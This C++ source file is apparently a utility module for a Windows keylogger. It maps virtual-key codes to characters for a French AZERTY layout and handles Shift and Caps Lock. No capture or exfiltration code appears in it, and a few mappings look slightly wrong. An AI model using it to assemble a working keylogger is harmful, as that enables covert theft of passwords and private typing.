#include "keylogger_utils.h"
#include <unordered_map>
#include <string>

// Function to handle special characters and key combinations
std::wstring GetSpecialKey(int key) {
    switch (key) {
        case VK_SPACE: return L" ";
        case VK_RETURN: return L"\n";
        case VK_RBUTTON: return L"[RCLICK]";
        case VK_LBUTTON: return L"[LCLICK]";
        case VK_TAB: return L"\t";
        default: return L"";
    }
}

bool IsSpecialKey(int key) {
    switch (key) {
        case VK_SHIFT:
        case VK_BACK:
        case VK_CONTROL:
        case VK_MENU: // ALT key
        case VK_CAPITAL:
        case VK_TAB:
        case VK_LWIN: // Left Windows key
        case VK_RWIN: // Right Windows key
        case VK_APPS: // Applications key
            return true;
        default:
            return false;
    }
}

// Function to handle accented characters and key combinations
wchar_t GetCharacterFromKey(int key, bool isShiftPressed, bool isCapsLockOn) {
    if (key == VK_SPACE) {
        return L' ';
    }
    if (key == VK_RETURN){
        return L'\n';
    }

    if (IsSpecialKey(key)) {
        return L'\0';
    }

    std::unordered_map<int, wchar_t> shiftKeys = {
        {0x30, L'°'}, {0x31, L'1'}, {0x32, L'2'}, {0x33, L'3'}, {0x34, L'4'},
        {0x35, L'5'}, {0x36, L'6'}, {0x37, L'7'}, {0x38, L'8'}, {0x39, L'9'},
        {0xBA, L'£'}, {0xBB, L'+'}, {0xBC, L'?'}, {0xBD, L'_'}, {0xBE, L'.'}, {0xBF, L'/'},
        {0xC0, L'¨'}, {0xDB, L'°'}, {0xDC, L'|'}, {0xDD, L'µ'}, {0xDE, L'%'}
    };

    std::unordered_map<int, wchar_t> noShiftKeys = {
        {0x30, L'à'}, {0x31, L'&'}, {0x32, L'é'}, {0x33, L'"'}, {0x34, L'\''},
        {0x35, L'('}, {0x36, L'-'}, {0x37, L'è'}, {0x38, L'_'}, {0x39, L'ç'},
        {0xBA, L'^'}, {0xBB, L'='}, {0xBC, L','}, {0xBD, L'('}, {0xBE, L';'}, {0xBF, L':'},
        {0xC0, L'²'}, {0xDB, L')'}, {0xDC, L'*'}, {0xDD, L'['}, {0xDE, L'$'}
    };

    if (key >= 0x41 && key <= 0x5A) { // A-Z
        if (isShiftPressed ^ isCapsLockOn) {
            return key;
        } else {
            return key + 32; // Convert to lowercase
        }
    } else if (key >= 0x30 && key <= 0x39) { // 0-9
        if (isShiftPressed) {
            return shiftKeys[key];
        } else {
            return noShiftKeys[key];
        }
    } else if (shiftKeys.find(key) != shiftKeys.end()) {
        if (isShiftPressed) {
            return shiftKeys[key];
        } else {
            return noShiftKeys[key];
        }
    }
    return L'\0' ;
}
